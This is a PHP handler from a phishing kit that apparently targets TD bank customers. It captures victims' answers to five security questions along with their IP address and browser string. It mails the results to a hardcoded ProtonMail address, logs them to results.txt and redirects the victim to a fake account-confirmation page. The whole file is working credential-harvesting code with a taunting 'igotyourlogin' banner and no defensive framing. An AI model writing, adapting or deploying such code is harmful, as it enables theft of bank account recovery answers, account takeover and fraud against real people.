<?php
include("blocker.php");
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message = "";
$message .= "-----------------2 QuestionDetails----------------\n";
$message .= "Question	: ".$_POST['question1']."\n";
$message .= "Answer		: ".$_POST['answer1']."\n";
$message .= "Question	: ".$_POST['question2']."\n";
$message .= "Answer		: ".$_POST['answer2']."\n";
$message .= "Question	: ".$_POST['question3']."\n";
$message .= "Answer		: ".$_POST['answer3']."\n";
$message .= "Question	: ".$_POST['question4']."\n";
$message .= "Answer		: ".$_POST['answer4']."\n";
$message .= "Question	: ".$_POST['question5']."\n";
$message .= "Answer		: ".$_POST['answer5']."\n";
$message .= "-----------------upgraded by igotyourlogin :)---------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------TD Results-----------------------\n";
$send = "rikkogreen44@protonmail.com";
$subject = "TDResultz 1 ".$_POST['results'];

@mail($send,$subject,$message);

$fp = fopen('results.txt', 'a');
fwrite($fp, $message);
fclose($fp);
?>
<script>
    window.top.location.href = "accountConfirm.htm?product=7";

</script>